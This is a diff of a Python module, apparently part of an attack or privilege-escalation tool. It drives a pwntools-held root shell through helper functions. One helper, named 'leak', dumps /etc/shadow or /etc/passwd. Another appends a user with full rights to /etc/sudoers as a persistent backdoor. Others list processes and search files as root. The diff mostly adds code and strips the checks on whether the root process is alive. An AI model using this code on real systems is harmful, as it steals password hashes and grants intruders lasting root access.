@@ -1,4 +1,6 @@
 from pathlib import Path
+
+from pwnlib.tubes.process import process
 import importFile
 from executeCommand import executeOnce
 from formatOutput.prettyAnnounce import bcolors, log
@@ -21,7 +23,6 @@ branch = f'{bcolors.WARNING}│{bcolors.ENDC}   '
 # pointers:
 tee =    f'{bcolors.WARNING}├──{bcolors.ENDC} '
 last =   f'{bcolors.WARNING}└──{bcolors.ENDC} '
-
 
 def tree_in_verbose(dir_path: Path, prefix: str=''):
     """A recursive generator, given a directory Path object
@@ -96,51 +97,58 @@ def list_ext_at_path(path, ext):
     list_f_response = glob.glob(f'{path}/*.{ext}')
     return list_f_response
 
+def list_ext_at_path_by_root(root,path, ext):
+    '''
+        Liệt kê file nằm ở đường dẫn path có đuôi .[ext]
+        parm1 path: đường dẫn tìm kiếm
+        parm2 ext: đuôi file tìm kiếm
+
+        return:
+        danh sách các dòng trả về 
+    '''
+    find_cmd = f'find {path} -type f -name "*.{ext}"'
+    resp = root_do_and_response(root,find_cmd)
+    return resp.split('\n')
+
 def list_process_as_root(root_talk):
     '''
     Liệt kê các tiến trình đang chạy bằng quyền root
-    return: -1 nếu tiến trình root bị đóng -> Int
-    return: -2 nếu hệ điều hành không phải linux -> Int 
+    return: -1 nếu hệ điều hành không phải linux -> Int 
     return: danh sách tiến trình nếu thành công -> List
     '''
     if(importFile.os_type.upper()=='Linux'.upper()):
         process_list = []
-        if(root_talk.poll()==None):
-            root_talk.sendline("ps -aux")
-            while(True):
-                out = root_talk.recvline(timeout=0.3).strip(b'\n').decode()
-                if(out==''):
-                    break
-                process_list.append(out)
-            return process_list
-        else:
-            return -1
+
+        root_talk.sendline("ps -aux")
+        while(True):
+            out = root_talk.recvline(timeout=0.3).strip(b'\n').decode()
+            if(out==''):
+                break
+            process_list.append(out)
+        return process_list
+
     else:
-        return -2
+        return -1
     
 def leak(name,root_talk):
     '''
     Lấy thông tin file shadow hoặc passwd
     return:
     -1 : nếu file không phải là shadow, passwd
-    -2 : nếu process root bị đóng
     [] : danh sách lines trong file
     '''
     if(name not in ['shadow','passwd']):
         return -1
     else:
-        if(root_talk.poll()==None):
-            user_l = []
-            root_talk.sendline(f'cat /etc/{name}')
-            while(True):
-                out = root_talk.recvline(timeout=0.3).strip(b'\n').decode()
-                if(out==''):
-                    break
-                user_l.append(out)
-            return user_l
-        else:
-            return -2
 
+        user_l = []
+        root_talk.sendline(f'cat /etc/{name}')
+        while(True):
+            out = root_talk.recvline(timeout=0.3).strip(b'\n').decode()
+            if(out==''):
+                break
+            user_l.append(out)
+        return user_l
 
 is_done = 0
 def waiting_bar():
@@ -207,10 +215,23 @@ def print_check_stdout_stderr(arg):
     if(stderr_s!='' and not 'warning' in stderr_s and not "WARNING" in stderr_s):
         log.fail(stderr_s)
 
-def main():
-    # print(Path.home())
-    # print_tree('/home/cheaterdxd/dttn')
-    list_dir('/home/cheaterdxd')
+
+def root_do_and_response(root:process,cmd):
+    '''
+    root thực hiện lệnh và trả về 
+    output: 
+    str, nếu câu lệnh trả về
+    '', nếu câu lệnh không trả về
+    '''
+
+    all_o = b''
+    root.sendline(cmd)
+    while(True):
+        out1 = root.recv(1,timeout=0.3)
+        all_o += out1
+        if(len(out1) < 1):
+            break
+    return all_o.decode('latin-1')
 
 def yes_no_ask(ques):
     '''
@@ -241,25 +262,16 @@ def up_root_for_exist_user(root_talk, username:str):
     return 
         0 nếu thành công
         -1 nếu thất bại
-        -2 nếu tiến trình root đã kết thúc
     '''
     command = f"echo '{username}    ALL=(ALL) ALL' >> /etc/sudoers"
-    if(root_talk.poll()==None):
-        root_talk.sendline(command)
-        root_talk.sendline('tail -1 /etc/sudoers')
-        while(True):
-            out = root_talk.recvline(timeout=0.3).strip(b'\n').decode()
-            if(out==''):
-                break
-            if f'{username}    ALL=(ALL) ALL' in out:
-                return 0
 
-        return -1
-    else:
-        return -2
+    root_talk.sendline(command)
+    root_talk.sendline('tail -1 /etc/sudoers')
+    while(True):
+        out = root_talk.recvline(timeout=0.3).strip(b'\n').decode()
+        if(out==''):
+            break
+        if f'{username}    ALL=(ALL) ALL' in out:
+            return 0
 
-
-
-if __name__ == "__main__":
-    main()
-
+    return -1
